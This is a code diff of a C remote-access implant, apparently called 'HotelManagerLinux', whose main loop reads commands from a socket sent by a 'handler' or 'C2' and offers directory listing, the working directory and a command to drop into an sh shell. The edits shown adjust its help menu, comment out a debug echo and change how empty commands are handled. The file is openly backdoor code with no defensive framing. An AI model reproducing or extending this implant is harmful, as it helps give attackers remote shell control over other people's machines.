@@ -84,11 +84,10 @@ int main(int argc, char *argv[])
 
 
 		int check = 1;	//this will be a prompt for handler
-		//char *prompt = "HotelManagerLinux> ";	//prompt for handler (fill with payload name) HANDLED BY THE HANDLER NOW
 
 		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
 		char help[32][1024];
-		strcpy(help[0],	 "\n----------HELP MENU----------\n\n");
+		strcpy(help[0],	 "\n----------HELP MENU----------\n");
 		strcpy(help[1],	 "ls - Print contents of directory\n");
 		strcpy(help[2],	 "pwd -	print working directory\n");
 		strcpy(help[3],	 "shell - drop into sh shell\n");
@@ -116,13 +115,11 @@ int main(int argc, char *argv[])
 			for(int i = 0; i < 2048; i++)
 				command[i] = 0;	//reset command to nulls so that no past command is left over
 
-			//write(sock, prompt, strlen(prompt));	//write the prompt to buffer DONE BY HANDLER
-
 			read(sock, command, sizeof(command));	//read the command from buffer
 
-			write(sock, command, strlen(command));	//for testing writing command back to handler
+			//write(sock, command, strlen(command));	//for testing writing command back to handler
 
-			//command[strlen(command) -1] = 0;	//take care of the newline fixed by my handler
+			//command[strlen(command) -1] = 0;	//take care of the newline
 
 			if(!strcmp("exit", command))
 				check = 0;	//exit on this
@@ -180,7 +177,8 @@ int main(int argc, char *argv[])
 			else if(!strcmp("clear", command))	//clears the C2 screen
 				system("clear");
 
-			else if(!strcmp("", command));		//do nothing on empty command
+			else if(!strcmp("", command))		//do nothing on empty command
+				system("clear");
 
 			else
 				write(sock, error, strlen(error));	//write error message if commnd is not recognized
